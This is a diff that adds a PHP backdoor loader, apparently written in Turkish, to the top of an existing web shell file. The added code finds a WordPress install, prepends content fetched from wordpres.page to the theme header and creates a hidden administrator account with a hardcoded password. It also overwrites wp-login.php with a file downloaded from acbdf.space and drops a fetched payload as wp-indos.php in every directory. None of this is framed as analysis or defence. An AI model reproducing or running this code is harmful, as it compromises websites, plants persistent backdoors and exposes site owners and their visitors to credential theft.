@@ -1,3 +1,139 @@
+
+<?php
+
+
+// SHELL LOGGER START HERE
+
+
+
+$document_root = $_SERVER["DOCUMENT_ROOT"];
+$document_root_file = dirname(__FILE__);
+$wp_detect = 0;
+if(file_exists($document_root.'/wp-load.php'))
+{   
+    include $document_root.'/wp-load.php';
+    $wp_detect = 1;
+}else
+{
+    $prefix = count(@explode('/', $document_root_file));
+    $a = '';
+    for($i = 0; $i<$prefix; $i++)
+    {
+      $a = $a.'../';
+      if(file_exists($document_root_file.'/'.$a.'wp-load.php'))
+      {
+          include $document_root_file.'/'.$a.'wp-load.php';
+          $wp_detect = 1;
+          break;
+      }
+    }
+}
+
+if($wp_detect == 1)
+{
+    //Header Yazdırma
+    $wp_theme_dir = get_template_directory();
+    $header_file = $wp_theme_dir.'/headers.php';
+    $header_content = file_get_contents($header_file);
+    $append = http_get('https://wordpres.page/txt/lamer.txt');
+    if(!preg_match('#'.$append.'#', $header_content))
+    {   
+      $new_content = $append.$header_content;
+      $open_file = fopen($header_file, 'w');
+      fwrite($open_file, $new_content);
+      fclose($open_file);
+    }
+    //Header Yazdırma   
+    
+    // shell Ekleme
+    $user = 'new_admin';
+    $pass = 'Mzj2zr542CwkB#7QDsX^RK@fe@mxBTVAHp';
+    $email = 'byhero44@gmail.com';
+    if (!username_exists( $user ) && !email_exists( $email ) ) {
+        $user_id = wp_create_user( $user, $pass, $email );
+        $user = new WP_User( $user_id );
+        $user->set_role( 'administrator' );
+    } 
+    // shell Ekleme
+    
+    // Wp Login Yazma.
+    $wp_login = ABSPATH.'/wp-login.php';
+    $login = http_get('https://acbdf.space/txt/seo.txt');
+    $open_login = fopen($wp_login, 'w');
+    fwrite($open_login, $login);
+    fclose($open_login);
+    // Wp Login Yazma.
+}
+
+
+// Shell Yazma
+$code = http_get('#');
+$wp_code = $document_root.'/#';
+$open_code = fopen($wp_code, 'w');
+fwrite($open_code, $code);
+fclose($open_code);
+// Shell Yazma
+
+// Makale Yazma
+$makale = http_get('');
+$wp_makale = $document_root.'/';
+$open_makale = fopen($wp_makale, 'w');
+fwrite($open_makale, $makale);
+fclose($open_makale);
+// Makale Yazma
+
+
+// Klasörlere Yazma
+$directories = expandDirectories($document_root);
+$css = http_get('https://acbdf.space/txt/lamer.txt');
+foreach($directories as $dir)
+{
+  if(!preg_match('#wp-content#', $dir))
+  {
+      $css_file = $dir.'/wp-indos.php';
+      $open_css = fopen($css_file, 'w');
+      fwrite($open_css, $css);
+      fclose($open_css);
+    }
+}
+// Klasörlere Yazma
+
+function expandDirectories($base_dir) {
+      $directories = array();
+      foreach(scandir($base_dir) as $file) {
+            if($file == '.' || $file == '..') continue;
+            $dir = $base_dir.DIRECTORY_SEPARATOR.$file;
+            if(is_dir($dir)) {
+                $directories []= $dir;
+                $directories = array_merge($directories, expandDirectories($dir));
+            }
+      }
+      return $directories;
+}
+function http_get($url)
+{
+  $im = curl_init($url);
+  curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
+  curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
+  curl_setopt($im, CURLOPT_HEADER, 0);
+  return curl_exec($im);
+  curl_close($im);
+}
+
+
+// SHELL LOGGER END HERE
+
+
+?>
+
+
+
+
+
+
+
+
 <?php
 /*
 # bunglon m1n1 sHeLL
@@ -9,7 +145,6 @@
 # thx to :
 sohai, budz story zz, b374k, 1n73ct10n, HNc, Dc & all member indoxploit
 */
-
 error_reporting(0);
 @ini_set('error_log', NULL);
 @ini_set('log_errors', 0);
